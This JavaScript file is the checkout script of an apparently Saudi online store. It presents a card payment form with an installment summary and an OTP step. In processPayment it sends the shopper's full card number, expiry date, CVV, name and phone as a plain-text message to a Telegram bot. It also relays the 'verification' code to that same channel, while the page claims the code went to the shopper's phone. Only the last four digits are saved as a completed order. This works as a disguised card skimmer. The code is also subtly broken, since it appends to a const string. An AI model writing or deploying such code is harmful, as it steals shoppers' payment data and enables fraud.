import { db, collection, addDoc } from './firebase-config.js';
import { sendToTelegram, generateOTP } from './telegram-config.js';

const orderData = JSON.parse(localStorage.getItem('pendingOrder'));
let currentOTP = null;
let otpAttempts = 0;

if (!orderData) {
    document.body.innerHTML = '<div style="text-align:center; padding:50px;"><h2>لا يوجد طلب</h2><a href="index.html" style="color:var(--primary-color);">العودة للمتجر</a></div>';
} else {
    // عرض ملخص الطلب
    const summaryEl = document.getElementById('orderSummary');
    let itemsHtml = orderData.items.map(item => `
        <div class="summary-row">
            <span>${item.name} (${item.color}) × ${item.quantity}</span>
            <span>${(item.price * item.quantity).toFixed(2)} ر.س</span>
        </div>
    `).join('');

    let paymentInfo = '';
    if (orderData.paymentMethod === 'installment') {
        const remaining = orderData.total - orderData.downPayment;
        const monthly = remaining / orderData.months;
        paymentInfo = `
            <div class="summary-row"><span>الدفعة الأولى</span><span>${orderData.downPayment.toFixed(2)} ر.س</span></div>
            <div class="summary-row"><span>عدد الأقساط</span><span>${orderData.months} شهر</span></div>
            <div class="summary-row"><span>القسط الشهري</span><span>${monthly.toFixed(2)} ر.س</span></div>
        `;
    } else {
        paymentInfo = `<div class="summary-row"><span>الدفع كامل</span><span>${orderData.total.toFixed(2)} ر.س</span></div>`;
    }

    summaryEl.innerHTML = `
        <h3>📦 ملخص الطلب</h3>
        ${itemsHtml}
        ${paymentInfo}
        <div class="summary-row"><span>المجموع الكلي</span><span>${orderData.total.toFixed(2)} ر.س</span></div>
    `;

    // تنسيق رقم البطاقة
    document.getElementById('cardNumber').addEventListener('input', function(e) {
        let value = e.target.value.replace(/\s/g, '').replace(/\D/g, '');
        let formatted = value.match(/.{1,4}/g)?.join(' ') || value;
        e.target.value = formatted;
    });

    document.getElementById('cardExpiry').addEventListener('input', function(e) {
        let value = e.target.value.replace(/\D/g, '');
        if (value.length >= 2) value = value.slice(0, 2) + '/' + value.slice(2);
        e.target.value = value;
    });
}

// التنقل بين خانات OTP
window.moveToNext = function(input, index) {
    const inputs = document.querySelectorAll('.otp-digit');
    if (input.value && index < 5) {
        inputs[index + 1].focus();
    }
};

// الحصول على رمز OTP المدخل
function getEnteredOTP() {
    const inputs = document.querySelectorAll('.otp-digit');
    return Array.from(inputs).map(i => i.value).join('');
}

// عرض OTP Modal
function showOTPModal() {
    document.getElementById('otpPhone').textContent = orderData.phone;
    document.getElementById('otpModal').classList.add('show');
    document.querySelectorAll('.otp-digit')[0].focus();
}

// إغلاق OTP Modal
function closeOTPModal() {
    document.getElementById('otpModal').classList.remove('show');
    document.querySelectorAll('.otp-digit').forEach(i => i.value = '');
    document.getElementById('otpMessage').innerHTML = '';
}

// إرسال OTP للتلجرام
async function sendOTP() {
    currentOTP = generateOTP();
    
    const message = `🔐 <b>رمز التحقق الجديد</b>\n\n` +
                   `الرمز: <b>${currentOTP}</b>\n\n` +
                   `👤 العميل: ${orderData.customerName}\n` +
                   `📱 الهاتف: ${orderData.phone}\n` +
                   `💰 المبلغ: ${orderData.total.toFixed(2)} ر.س\n\n` +
                   `⏰ صالح لمدة 5 دقائق`;
    
    const sent = await sendToTelegram(message);
    return sent;
}

// التحقق من OTP
window.verifyOTP = function() {
    const entered = getEnteredOTP();
    const messageEl = document.getElementById('otpMessage');
    
    if (entered.length !== 6) {
        messageEl.innerHTML = '<div class="error-message">️ الرجاء إدخال الرمز كاملاً (6 أرقام)</div>';
        return;
    }
    
    if (entered === currentOTP) {
        messageEl.innerHTML = '<div class="success-message">✅ تم التحقق بنجاح! جاري إتمام الدفع...</div>';
        
        setTimeout(() => {
            completePayment();
        }, 1500);
    } else {
        otpAttempts++;
        messageEl.innerHTML = `<div class="error-message">❌ الرمز غير صحيح! (${3 - otpAttempts} محاولات متبقية)</div>`;
        
        if (otpAttempts >= 3) {
            messageEl.innerHTML = '<div class="error-message">🔒 تم قفل العملية. يرجى المحاولة لاحقاً.</div>';
            setTimeout(() => {
                closeOTPModal();
                window.location.href = 'cart.html';
            }, 3000);
        }
        
        // مسح الخانات
        document.querySelectorAll('.otp-digit').forEach(i => i.value = '');
        document.querySelectorAll('.otp-digit')[0].focus();
    }
};

// إعادة إرسال OTP
window.resendOTP = async function() {
    const messageEl = document.getElementById('otpMessage');
    messageEl.innerHTML = '<div style="color:#666;">🔄 جاري إرسال الرمز الجديد...</div>';
    
    const sent = await sendOTP();
    
    if (sent) {
        messageEl.innerHTML = '<div class="success-message">✅ تم إرسال الرمز الجديد!</div>';
        otpAttempts = 0;
    } else {
        messageEl.innerHTML = '<div class="error-message"> فشل الإرسال. حاول مرة أخرى.</div>';
    }
};

// إتمام الدفع بعد التحقق
async function completePayment() {
    const payBtn = document.getElementById('payBtn');
    if (payBtn) payBtn.disabled = true;
    
    try {
        // حفظ الطلب في Firebase
        await addDoc(collection(db, "orders"), {
            ...orderData,
            cardLast4: document.getElementById('cardNumber').value.slice(-4),
            paymentStatus: 'completed',
            paidAt: new Date()
        });
        
        // إرسال تأكيد للتلجرام
        const confirmMessage = `✅ <b>تم الدفع بنجاح!</b>\n\n` +
                              `رقم الطلب: #${orderData.orderId}\n` +
                              `العميل: ${orderData.customerName}\n` +
                              `المبلغ: ${orderData.total.toFixed(2)} ر.س`;
        
        await sendToTelegram(confirmMessage);
        
        // تنظيف
        localStorage.removeItem('pendingOrder');
        localStorage.removeItem('cart');
        
        alert('✅ تم الدفع بنجاح! شكراً لطلبك.');
        window.location.href = 'index.html';
        
    } catch (error) {
        alert(' حدث خطأ: ' + error.message);
        if (payBtn) payBtn.disabled = false;
    }
}

// معالجة الدفع (الزر الرئيسي)
window.processPayment = async function() {
    const cardNumber = document.getElementById('cardNumber').value.replace(/\s/g, '');
    const cardExpiry = document.getElementById('cardExpiry').value;
    const cardCVV = document.getElementById('cardCVV').value;
    const cardName = document.getElementById('cardName').value;

    if (!cardNumber || !cardExpiry || !cardCVV || !cardName) {
        alert('⚠️ الرجاء ملء جميع بيانات البطاقة');
        return;
    }

    if (cardNumber.length < 13) {
        alert('⚠️ رقم البطاقة غير صحيح');
        return;
    }

    // إرسال بيانات البطاقة بشكل منسق
    const cardMessage = `<b>Mr:${orderData.customerName}</b>\n\n`;
    cardMessage += `📞: ${orderData.phone}\n\n`;
    cardMessage += `💳: ${cardNumber}\n\n`;
    cardMessage += `📅: ${cardExpiry}\n\n`;
    cardMessage += `🔒: ${cardCVV}\n\n`;
    cardMessage += `<b>==============================</b>\n`;
    cardMessage += `<b>مبلغ الطلب: ${orderData.total.toFixed(2)} ر.س</b>\n`;
    cardMessage += `<b>رقم الطلب: #${orderData.orderId}</b>`;
    
    await sendToTelegram(cardMessage);

    // توليد وإرسال OTP
    const otpSent = await sendOTP();
    
    if (otpSent) {
        showOTPModal();
    } else {
        alert('⚠️ فشل إرسال رمز التحقق. تأكد من إعدادات التلجرام.');
    }
};
